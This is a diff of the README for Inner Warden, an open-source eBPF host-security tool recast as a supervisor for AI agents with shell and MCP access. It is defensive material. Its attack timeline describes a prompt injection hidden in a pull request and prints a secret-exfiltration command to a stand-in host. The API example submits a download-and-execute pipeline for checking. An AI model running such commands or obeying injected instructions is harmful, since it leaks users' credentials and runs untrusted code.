@@ -1,12 +1,14 @@
 # Inner Warden
 
-**The security agent that fights back.**
+**Local safety layer for AI agents that can use the terminal.**
 
-Most security tools warn you when something's wrong. Inner Warden runs its own AI **inside your server**, decides what's a real threat, and stops it. No team to react, no cloud needed. Open source, you decide where your data goes.
+AI agents are starting to do real work: read files, run commands, install packages, call APIs, and touch servers. That is useful. It is also the moment a chatbot becomes something with operational power.
 
-> It's 2 AM. Someone brute-forces your SSH. You're asleep.
-> Inner Warden blocks the IP, captures the session, deploys a honeypot, and alerts you on Telegram.
-> You wake up to a report, not a compromised server.
+Inner Warden sits outside the agent, on the host it is using. It screens risky commands and MCP/tool traffic routed through its guard, watches the real Linux activity underneath with eBPF, blocks or flags dangerous behavior, and keeps the decision trail local. No cloud control plane. Open source. Dry-run by default.
+
+> Your agent reads a pull request, a web page, or a file with hidden instructions.
+> It tries to read secrets, run an unsafe shell command, or connect somewhere it should not.
+> Inner Warden catches the action before the damage leaves the box, then shows you what happened and why.
 
 ```bash
 curl -fsSL https://innerwarden.com/install | sudo bash
@@ -25,7 +27,7 @@ Installs in 10 seconds. Starts in observe-only mode. Dry-run by default. You dec
 ![eBPF Programs](https://img.shields.io/badge/eBPF%20programs-45%20loaded-blueviolet)
 ![Detectors](https://img.shields.io/badge/detectors-82-blue)
 ![Correlation Rules](https://img.shields.io/badge/correlation%20rules-69-purple)
-![Tests](https://img.shields.io/badge/tests-8000%2B-brightgreen)
+![Tests](https://img.shields.io/badge/tests-7900%2B-brightgreen)
 ![MITRE Coverage](https://img.shields.io/badge/MITRE%20ATT%26CK-90%2B%20mappings-red)
 ![Sigma Rules](https://img.shields.io/badge/Sigma%20rules-208-blueviolet)
 ![Memory](https://img.shields.io/badge/memory-~250MB%20(full%20stack)-green)
@@ -37,34 +39,43 @@ Installs in 10 seconds. Starts in observe-only mode. Dry-run by default. You dec
 
 ### Who is this for?
 
+- **Developers and self-hosters** running AI agents that can edit code, call tools, or touch a shell
+- **Founders and operators** who want to bring agents into real business workflows without "just trust the prompt" as the security plan
 - **SREs and sysadmins** who manage Linux servers and want automated threat response, not just alerts
-- **Self-hosters** who run exposed services and need production-grade security without enterprise pricing
-- **AI agent operators** who run OpenClaw, LangChain, or n8n and need to stop agents from executing dangerous commands
-- **Security teams** who want kernel-level visibility (eBPF) with MITRE ATT&CK coverage and compliance (ISO 27001)
+- **Security teams** who want kernel-level visibility (eBPF), MITRE ATT&CK coverage, local audit trails, and clear operator controls
 
 ### How is this different?
 
-It lives where the action is. Not a tool watching from outside, not an alert in someone else's dashboard. Inner Warden runs inside the server, sees what every program does, and decides what to do — all without leaving the box. One binary, one SQLite database, no SIEM bundle, no external IDS, no cloud control plane. Two Rust daemons and a CLI.
+Prompt guardrails try to control what an agent says. Inner Warden controls what it actually does.
 
-45 eBPF kernel programs (loaded in prod; kernel-dependent). 82 detectors. 29 collectors. 69 cross-layer correlation rules. 90+ MITRE ATT&CK techniques covered across all 14 Linux tactics. 8000+ unit tests (665 named anchors that pin past bug fixes — see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change. 208 Sigma community rules. Autoencoder anomaly detection. Behavioral DNA attacker fingerprinting. JA3/JA4 TLS fingerprinting. YARA + Sigma rule engines. Monthly threat reports. Mesh collaborative defense. **Unified SQLite store** for every artifact (incidents, decisions, KV cache, graph snapshots, attacker profiles). **Intelligent notifications**: incidents group into a single Telegram message per IP instead of one-per-event. **Circuit breaker**: per-hour cap on autonomous block decisions protects against runaway enforcement (pause / log-only / dry-run modes). **Continuous trust scoring**: graduated enforcement plus daily self-check. **Regression safety net**: `make scenario-qa` gates every PR against drift for 7 canonical attack scenarios.
+It lives where the action is: on the machine the agent can affect. Agent-facing checks can review commands and MCP tool calls before they run; host-level sensors still watch what actually executes. If the agent is tricked, the safety layer is not inside the thing being tricked. One binary, one SQLite database, no SIEM bundle, no external IDS, no cloud control plane. Two Rust daemons and a CLI.
+
+**In plain terms, it does three things:**
+
+- **Supervise.** It screens an agent's commands and MCP/tool calls *before* they run and returns allow, review, or block, scored against embedded Agent Threat Rules.
+- **Watch.** It sees what actually executes on the host with eBPF, so if something slips past the polite guardrail it is still caught.
+- **Prove.** It records every decision locally in a tamper-evident audit trail. No cloud, your data never leaves the box.
+
+Under the hood: 45 eBPF programs, 82 detectors, 69 cross-layer correlation rules, 90+ MITRE ATT&CK techniques, and 7900+ tests gate every change. The full tour is further down: [what it does](#what-it-does), [what it detects](#what-it-detects), [how it works](#how-it-works).
 
 <h3 align="center">
   <a href="https://innerwarden.com/live">See it responding to real attacks right now</a>
 </h3>
 
-https://github.com/user-attachments/assets/3acf547d-9c5c-4f83-bcfa-22ba68e21741
-
 ---
 
 ### Why this exists
 
-I built Inner Warden because I wanted something that could detect a reverse shell at the kernel level, block the attacker, deploy a honeypot, and alert me on Telegram, all in under 5 seconds, with zero external dependencies. So I built it.
+I built Inner Warden because agents are going to do real work, and real work needs supervision. The same system that can catch a reverse shell at the kernel level, block an attacker, deploy a honeypot, and alert you on Telegram can also sit underneath an AI agent and ask a simpler question: "is this action safe to let through?"
 
-Apache-2.0. If this project helps protect your servers, [give it a star](https://github.com/InnerWarden/innerwarden/stargazers) so others can find it.
+Apache-2.0. If this project helps make agent automation safer to try, [give it a star](https://github.com/InnerWarden/innerwarden/stargazers) so others can find it.
 
 ---
 
 ## Architecture
+
+<details>
+<summary><b>Full layered architecture</b>: firmware (Ring -2) to kernel eBPF to sensor to agent to response. Click to expand.</summary>
 
 ```
 ┌─────────────────────────────────────────────────────────────────────┐
@@ -103,7 +114,7 @@ Apache-2.0. If this project helps protect your servers, [give it a star](https:/
 │                                                                   │
 │  ┌─────────┐ ┌─────────┐ ┌────────┐ ┌────────────────────────┐    │
 │  │auth.log │ │journald │ │ Docker │ │    eBPF collector      │◄─┘ |
-│  │nginx    │ │syslog   │ │ cgroup │ │    (54 compiled)       │    |
+│  │nginx    │ │syslog   │ │ cgroup │ │    (47 compiled)       │    |
 │  └────┬────┘ └────┬────┘ └──┬──── ┘ └───────────┬────────────┘    │
 │       │           │         │                   │                 │
 │  ┌────┴────┐ ┌────┴─────┐ ┌─┴──────────────┐    │                 │
@@ -114,7 +125,7 @@ Apache-2.0. If this project helps protect your servers, [give it a star](https:/
 │       └───────────┴───────────────┴─────────────┘                 │
 │                          │                                        │
 │                    ┌─────▼──────┐                                 │
-│                    │82 detectors│ + 8 YARA + 208 Sigma (+8 built-in)│
+│                    │82 detectors│ + 8 YARA + 208 Sigma (+9 built-in)│
 │                    │ stateful   │                                 │
 │                    └─────┬──────┘                                 │
 │                          │                                        │
@@ -191,6 +202,8 @@ Apache-2.0. If this project helps protect your servers, [give it a star](https:/
 └───────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 **Runtime layers between the AI Triage and the notification channels above:**
 
 - **Notification gate** — every channel (Telegram, Slack, Webhook, Push) goes through a single policy that returns `SendNow` / `DailyBriefingOnly` / `Drop`. Burst summary collapses 50+/h auto-blocks into one "all handled" message.
@@ -203,34 +216,37 @@ Apache-2.0. If this project helps protect your servers, [give it a star](https:/
 
 ## What it does
 
-1. **Watches**: 29 collectors across all layers — eBPF syscall tracing (54 kernel programs including timestomp and log truncation), firmware integrity (ESP, UEFI, ACPI, MSR, SPI), memory forensics (/proc/maps RWX detection), native network capture (DNS queries, HTTP requests, JA3/JA4 TLS fingerprinting), filesystem real-time monitoring, cgroup resource abuse, kernel integrity (syscall table + eBPF inventory), plus auth.log, journald, Docker, nginx, CloudTrail
-2. **Detects**: 82 stateful detectors + 8 YARA malware rules + 9 built-in Sigma rules + 208 community Sigma rules identify brute-force, credential stuffing, port scans, C2 callbacks (including tunnels via ngrok/cloudflared/bore, non-standard ports, and DNS/ICMP/SSH-forward protocol tunneling), privilege escalation (non-baseline SUID exec, dangerous-capability abuse), container escapes, reverse shells (eBPF syscall sequence — impossible to evade), ransomware (entropy analysis), rootkits, DNS tunneling, data exfiltration (sensitive file read → outbound connect by PID, plus scp/rsync staged-egress), timestomping, log tampering, discovery bursts (nmap, wordlist scanners, argv-driven anomaly), collection patterns (clipboard, screen capture, password-protected archives), persistence (PAM module tampering, RC scripts, systemd units, cron, SSH keys), defense evasion (auditd disable, SELinux/AppArmor disable), data destruction (rm -rf user data, disk wipe, mkfs/luksFormat on running volumes), symlink/hardlink hijack of sensitive files, service-account interactive shells (foothold signal), privilege-provenance escalation (a root process whose exe/parent/namespace provenance does not justify it — setns into a non-root-owned user namespace, uid-0 exec from a writable path), and more. **90+ MITRE ATT&CK techniques covered** across 14 tactics.
-3. **Correlates**: 69 cross-layer rules connect Firmware × Kernel × Userspace × Network × Honeypot events. Baseline anomalies, neural scores, and DDoS shield state all feed the correlation engine. Detects multi-stage attacks no single detector can see: firmware tampering → rootkit install, recon → brute force → data exfil, honeypot engagement → real attack on same IP, Discovery → Privesc → Lateral Movement chains, full kill chain Initial Access → Foothold → Persistence → Defense Evasion → Impact. The kill chain tracker tracks 7 attack stages per entity (IP, user, container).
-4. **Learns**: baseline anomaly detection trains for 7 days then alerts on deviations — event rate drops (silence = compromise), new process lineages (nginx→sh), unusual login times, unknown network destinations. No rules needed.
-5. **Blocks at the kernel**: LSM enforcement stops reverse shells and /tmp execution before they run. XDP drops attack traffic at wire speed. 8 kill chain patterns detected and blocked without signatures. Blocks propagate to mesh peers.
-6. **Responds automatically**: the AI decision path drives response skills directly (block IP via ufw/iptables/nftables/firewalld/XDP, suspend sudo, kill process, pause container, honeypot redirect, capture forensics + pcap, notify, escalate). On top of that, 3 built-in SOC playbook templates ship (data exfil, Log4Shell, credential stuffing) that you extend with your own YAML and turn on with `[playbooks] enabled` (opt-in, off by default)
-7. **Fingerprints attackers**: behavioral DNA (SHA-256 of detectors + tools + targets + timing patterns), **cross-IP tracking** (same attacker detected across VPN/Tor rotations via fuzzy DNA matching — risk score and detector knowledge inherited automatically), campaign detection via IOC clustering, recurrence tracking, risk scoring 0-100, monthly threat reports with MITRE heatmap
+1. **Guards agent actions**: agents and tool runners can call the local command-check API before acting, or route MCP tool calls through the inspecting proxy. Commands are scored against embedded Agent Threat Rules (ATR), risky actions can be denied or sent for review, and the host layer still verifies what actually ran.
+2. **Watches**: 31 collectors across every layer — eBPF syscall tracing (45 kernel programs), firmware integrity, memory forensics (/proc/maps RWX), native DNS/HTTP/TLS (JA3/JA4) capture, tunnel-interface monitoring (a new tun/WireGuard interface = a mesh-VPN brought up), real-time filesystem, cgroup, kernel integrity, plus auth.log, journald, Docker, nginx, CloudTrail. (Full collector list under [How it works](#how-it-works).)
+3. **Detects**: 82 stateful detectors + 8 YARA malware rules + 9 built-in Sigma rules + 208 community Sigma rules cover the full attack lifecycle — brute-force/credential stuffing, C2 (incl. ngrok/cloudflared/bore + mesh-VPN tunnels + DNS/ICMP/SSH-forward), privilege escalation, container escape, reverse shells (eBPF sequence, impossible to evade), ransomware, rootkits, exfiltration, persistence, defense evasion, data destruction, and more. **90+ MITRE ATT&CK techniques covered** across 12 ATT&CK tactics. (The per-detector table with MITRE IDs is in [What it detects](#what-it-detects).)
+4. **Correlates**: 69 cross-layer rules connect Firmware × Kernel × Userspace × Network × Honeypot events. Baseline anomalies, neural scores, and DDoS shield state all feed the correlation engine. Detects multi-stage attacks no single detector can see: firmware tampering → rootkit install, recon → brute force → data exfil, honeypot engagement → real attack on same IP, Discovery → Privesc → Lateral Movement chains, full kill chain Initial Access → Foothold → Persistence → Defense Evasion → Impact. The kill chain tracker tracks 7 attack stages per entity (IP, user, container).
+5. **Learns**: baseline anomaly detection trains for 7 days then alerts on deviations — event rate drops (silence = compromise), new process lineages (nginx→sh), unusual login times, unknown network destinations. No rules needed.
+6. **Blocks at the kernel**: LSM enforcement stops reverse shells and /tmp execution before they run. XDP drops attack traffic at wire speed. 8 kill chain patterns detected and blocked without signatures. Blocks propagate to mesh peers.
+7. **Responds automatically**: the AI decision path drives response skills directly (block IP via ufw/iptables/nftables/firewalld/XDP, suspend sudo, kill process, pause container, honeypot redirect, capture forensics + pcap, notify, escalate). On top of that, 3 built-in SOC playbook templates ship (data exfil, Log4Shell, credential stuffing) that you extend with your own YAML and turn on with `[playbooks] enabled` (opt-in, off by default)
+8. **Fingerprints attackers**: behavioral DNA (SHA-256 of detectors + tools + targets + timing patterns), **cross-IP tracking** (same attacker detected across VPN/Tor rotations via fuzzy DNA matching — risk score and detector knowledge inherited automatically), campaign detection via IOC clustering, recurrence tracking, risk scoring 0-100, monthly threat reports with MITRE heatmap
 
 Everything is local, audited, and reversible.
 
 ---
 
-## What happens when your server is attacked
+## What happens when an agent is tricked
 
 ```
-00:00  SSH brute-force begins from 203.0.113.10
-00:45  Detector fires: 8 failed logins, 5 usernames, one IP
+00:00  Your AI agent reads a pull request with hidden instructions
+00:01  The agent tries to run: curl https://example.bad/leak?token=$(cat .env)
 
-       AI evaluates: "coordinated brute-force"
-       Confidence: 0.94
-       Recommended action: block_ip
+       Agent guard evaluates: "secret read + outbound exfil"
+       ATR match: credential_exfiltration
+       Recommendation: deny
 
-00:46  Firewall rule added: ufw deny from 203.0.113.10
-00:46  Telegram alert lands on your phone
-00:46  Decision logged to audit trail
+00:01  Tool call / command is blocked or held for review
+00:01  eBPF/audit trail records what actually happened on the host
+00:01  Telegram alert lands on your phone
 
-       Threat contained.
+       The agent keeps working. The dangerous action does not.
 ```
+
+The same host-defense layer still protects the server itself. If someone brute-forces SSH at 2 AM, Inner Warden can detect the attack, block the IP, capture the session, deploy a honeypot, and send you a report before you wake up.
 
 No human needed when auto-execution is enabled. Otherwise, you approve via Telegram or the dashboard. Full audit trail. Every action reversible.
 
@@ -279,7 +295,7 @@ The real Autonomy Gap: an incident the Local Warden is not confident about, that
 
 ## What it detects
 
-82 stateful detectors + 8 YARA rules + 9 built-in Sigma rules + 208 community Sigma rules covering the full attack lifecycle. **90+ unique MITRE ATT&CK techniques across all 14 Linux tactics.** Highlights:
+82 stateful detectors + 8 YARA rules + 9 built-in Sigma rules + 208 community Sigma rules covering the full attack lifecycle. **90+ unique MITRE ATT&CK techniques across 12 ATT&CK tactics.** Highlights:
 
 | Detector | Threat | MITRE |
 |----------|--------|-------|
@@ -333,16 +349,17 @@ Plus: `docker_anomaly`, `search_abuse`, `credential_harvest`, `ssh_key_injection
 
 ## How it works
 
-**Sensor**: deterministic signal collection. No AI, no HTTP. 29 collectors (auth.log, journald, Docker events, file integrity, firmware integrity, nginx access/error, shell audit, macOS unified log, syslog firewall, eBPF syscall tracing with 45 kernel programs loaded, JA3/JA4 TLS fingerprinting, memory forensics via /proc/maps, real-time filesystem monitoring with entropy analysis, kernel integrity monitoring, cgroup resource abuse detection, SUID inventory, systemd unit inventory, sysctl drift, USB attach/detach, AWS CloudTrail). Events flow through a unified SQLite database (WAL mode) or Redis Streams to the agent. Syslog CEF output for SIEM integration. **8000+ unit tests** with **665 named anchors** (see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change before it can merge.
+**Sensor**: deterministic signal collection. No AI, no HTTP. 31 collectors (auth.log, journald, Docker events, file integrity, firmware integrity, nginx access/error, shell audit, macOS unified log, syslog firewall, eBPF syscall tracing with 45 kernel programs loaded, JA3/JA4 TLS fingerprinting, memory forensics via /proc/maps, real-time filesystem monitoring with entropy analysis, kernel integrity monitoring, cgroup resource abuse detection, SUID inventory, systemd unit inventory, sysctl drift, kernel audit state monitoring (alerts when the audit subsystem is disabled, T1562.001), tunnel-interface monitoring (new tun/WireGuard interface = mesh-VPN persistence, rename-proof), USB attach/detach, AWS CloudTrail). Events flow through a unified SQLite database (WAL mode) or Redis Streams to the agent. Syslog CEF output for SIEM integration. **7900+ unit tests** with **665 named anchors** (see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change before it can merge.
 
-**eBPF**: 54 kernel programs compiled, 45 loaded in prod (kernel-dependent). Linux 5.8+, CO-RE/BTF portable:
+**eBPF**: 47 kernel programs compiled, 45 loaded in prod (kernel-dependent). Linux 5.8+, CO-RE/BTF portable:
 - **23 tracepoints**: execve, connect, openat, ptrace, setuid, bind, mount, memfd_create, init_module, dup2/dup3, listen, mprotect, clone, unlinkat, renameat2, kill, prctl, accept4, sched_process_exit, ioperm, iopl, io_uring_submit, io_uring_create
 - **10 kprobes**: `commit_creds` (privilege escalation), `native_write_msr` (firmware MSR tampering), `acpi_evaluate_object` (ACPI rootkit detection), `do_truncate` (log tampering), plus 6 timing-based rootkit kprobes (Trace of the Times: iterate_dir, filldir64, tcp4_seq_show, proc_pid_readdir kprobe/kretprobe pairs)
 - **5 LSM kernel-block hooks** (Spec 052/053 + PR-A/B/C/D): `bprm_check_security` (exec blocking via PID→BLOCKED_PIDS map populated by kill chain detector), `userns_create` (container escape — blocks `unshare(CLONE_NEWUSER)` from chain-flagged PIDs), `ptrace_access_check` (process injection — blocks PTRACE_ATTACH/POKETEXT), `bpf_prog` (VoidLink defence — blocks malicious BPF program loads), `mmap_file` (real-time RWX block, replacing 5s `proc_maps` polling). Plus 2 legacy hooks (`file_open`, `bpf`) kept in parallel. All FP-free by design: legitimate users (Chrome sandbox, gdb, JIT compilers, systemd) pass through because they're never in BLOCKED_PIDS.
+- **Execution Gate primitive (opt-in, inert by default)**: a dedicated `bprm_check_security` LSM program (`innerwarden_lsm_exec_gate`) that can enforce a binary allowlist by path-hash — denying any executable whose path is not on the allowlist with `-EPERM`. It ships **inert** (`LSM_POLICY` key 3 = 0): visible and auditable in the sensor source, but enforcing nothing. The `EXEC_ALLOWLIST` map stays empty until populated by operator tooling, and enforcement turns on only when explicitly configured — so it changes nothing for a default install.
 - **XDP program**: wire-speed IP blocking at the network driver (10M+ pps drop rate)
 - **Phase 2 firmware hooks**: MSR write guard (LSTAR/SMRR), I/O port access (SPI controller probing), ACPI method execution monitoring
 
-> **Looking for the eBPF source code?** All 54 kernel programs live in a single file: [`crates/sensor-ebpf/src/main.rs`](crates/sensor-ebpf/src/main.rs).
+> **Looking for the eBPF source code?** All 47 kernel programs live in a single file: [`crates/sensor-ebpf/src/main.rs`](crates/sensor-ebpf/src/main.rs).
 
 **Kernel-level noise filters** keep overhead near zero: COMM_ALLOWLIST (137 trusted processes like sshd, systemd, docker), CGROUP_ALLOWLIST, PID_RATE_LIMIT, and PID_CHAIN. Tail call dispatcher routes events through a single attach point to N handlers via ProgramArray. Ring buffer with epoll wakeup delivers events in microseconds.
 
@@ -446,7 +463,6 @@ Enable what you need.
 | `abuseipdb-enrichment` | IP reputation context | Enriched AI prompt |
 | `dshield-enrichment` | SANS ISC IP reputation (keyless, read-only) | Enriched AI prompt |
 | `geoip-enrichment` | Country/ISP geolocation | Enriched AI prompt |
-| `fail2ban-integration` | Sync active fail2ban bans | Block enforcement |
 | `crowdsec-integration` | CrowdSec community intel | Block enforcement (experimental) |
 
 ```bash
@@ -465,13 +481,21 @@ innerwarden module search <term>     # search the registry
 
 ## Protecting AI agents
 
-If you run OpenClaw, n8n, Langchain, or any autonomous AI agent on your server, Inner Warden can watch what it does and stop it if something goes wrong.
+If you run an AI agent with access to a shell, files, API keys, MCP tools, or production-like infrastructure, Inner Warden gives it a supervisor outside the prompt.
+
+There are three protection surfaces:
+
+- **Advisor API** for agents or tools you can modify: ask Inner Warden before running a command or connecting to an IP.
+- **MCP inspecting proxy** for tool servers: screen `tools/call` arguments, tool descriptions, and tool results inline.
+- **Host-level verification** for connected agents: eBPF/audit signals show what actually executed even if the agent ignored advice.
+
+For the current built-in agent module:
 
 ```bash
 innerwarden enable openclaw-protection
 ```
 
-This enables real-time monitoring of every command your agent executes, using structural analysis (tree-sitter AST) instead of regex. Download-and-execute pipelines, reverse shells, staged attacks, and obfuscated commands are caught before they can do damage.
+This enables command monitoring and agent safety checks for supported local agents and custom tool runners. The command analyzer uses structural analysis (tree-sitter AST) and embedded Agent Threat Rules instead of simple regex. Download-and-execute pipelines, reverse shells, staged attacks, credential exfiltration, and obfuscated commands are caught before they become silent damage.
 
 ### Let your agent ask before acting
 
@@ -483,7 +507,7 @@ curl -s http://localhost:8787/api/agent/security-context
 # → {"threat_level": "low", "recommendation": "safe to proceed"}
 
 # "Is this command safe to run?"
-curl -s -X POST http://localhost:8787/api/agent/check-command \
+curl -s -X POST http://localhost:8787/api/advisor/check-command \
   -H "Content-Type: application/json" \
   -d '{"command": "curl https://example.com/setup.sh | bash"}'
 # → {"risk_score": 40, "recommendation": "review", "signals": ["download_and_execute"]}
@@ -493,9 +517,9 @@ curl -s "http://localhost:8787/api/agent/check-ip?ip=203.0.113.10"
 # → {"known_threat": true, "blocked": true, "recommendation": "avoid"}
 ```
 
-Your agent calls `check-command` before executing. If the recommendation is `deny`, it stops. No changes to the agent runtime needed, just an HTTP call.
+Your agent calls `check-command` before executing. If the recommendation is `deny`, it stops or asks the operator. If it ignores the advice and runs anyway, the host layer can still detect the execution and escalate the incident.
 
-**MCP inspecting proxy.** For agents that talk to MCP servers, wrap the server so every tool call and result is inspected inline — no agent changes needed:
+**MCP inspecting proxy.** For agents that talk to MCP servers, wrap the server so every tool call and result is inspected inline — no agent code changes needed:
 
 ```bash
 # Advisory (default): transparent pipe that alerts on threats
@@ -506,7 +530,7 @@ innerwarden agent proxy -- npx -y some-mcp-server
 innerwarden agent proxy --mode guard -- npx -y some-mcp-server
 ```
 
-It parses the JSON-RPC stdio stream and screens `tools/call` arguments, `tools/list` descriptions (tool poisoning), and tool results (injected responses). `kill` mode also terminates a server that issues a disallowed call.
+It parses the JSON-RPC stdio stream and screens `tools/call` arguments, `tools/list` descriptions (tool poisoning), and tool results (injected responses). `guard` mode returns a denial before the dangerous call reaches the real tool server.
 
 See [AI Agent Protection docs](modules/openclaw-protection/docs/README.md) for the full integration guide.
 
@@ -579,15 +603,11 @@ $ innerwarden system scan
   sshd       running  → ssh-protection       ESSENTIAL    [NATIVE]
   docker     running  → container-security    RECOMMENDED  [NATIVE]
   nginx      running  → search-protection     RECOMMENDED  [NATIVE]
-  fail2ban   running  → fail2ban-integration  RECOMMENDED  [NATIVE]
-
-  Conflicts detected:
-    fail2ban-integration + abuseipdb-enrichment: both auto-block IPs; enable one
 
   Activation sequence:
     1. innerwarden enable block-ip
     2. innerwarden enable ssh-protection
-    3. innerwarden enable fail2ban-integration
+    3. innerwarden enable search-protection
 ```
 
 **NATIVE** = reads existing logs, zero external deps. **EXTERNAL** = requires separate tool install.
@@ -619,6 +639,21 @@ curl -fsSL https://innerwarden.com/install | sudo bash -s -- --with-integrations
 Build from source:
 ```bash
 INNERWARDEN_BUILD_FROM_SOURCE=1 curl -fsSL https://innerwarden.com/install | sudo bash
+```
+
+### Uninstall
+
+```bash
+sudo innerwarden uninstall            # remove the software, keep config + data
+sudo innerwarden uninstall --purge    # also remove config, data, logs, and the user
+sudo innerwarden uninstall --dry-run  # preview exactly what would be removed
+```
+
+This stops every service (sensor, agent, supervisor, watchdog), removes the binaries, systemd units, embedded eBPF object, pinned BPF maps, sudoers drop-ins, and the firewall rules InnerWarden added. Config (`/etc/innerwarden`) and data (`/var/lib/innerwarden`) are kept by default so a reinstall keeps your history and license; `--purge` removes them too.
+
+If the `innerwarden` binary is missing or broken, the installer can tear everything down the same way:
+```bash
+curl -fsSL https://innerwarden.com/install | sudo bash -s -- --uninstall          # or --uninstall --purge
 ```
 
 ### Configure AI
@@ -704,7 +739,7 @@ innerwarden upgrade          # fetch + install latest (SHA-256 verified)
 innerwarden upgrade --check  # check without installing
 ```
 
-### 8 commands to protect your server
+### Useful commands
 
 ```bash
 innerwarden get status                              # services + today's activity
@@ -733,7 +768,9 @@ innerwarden system backup                           # archive configs to tar.gz
 innerwarden system navigator                        # export MITRE ATT&CK coverage map
 
 innerwarden module install <url>                    # SHA-256 verified community modules
-innerwarden agent connect                           # connect to running agents
+innerwarden agent scan                              # find known local agents and MCP configs
+innerwarden agent connect                           # connect agents you want supervised
+innerwarden agent proxy -- npx -y some-mcp-server   # wrap an MCP server with inspection
 ```
 
 ---
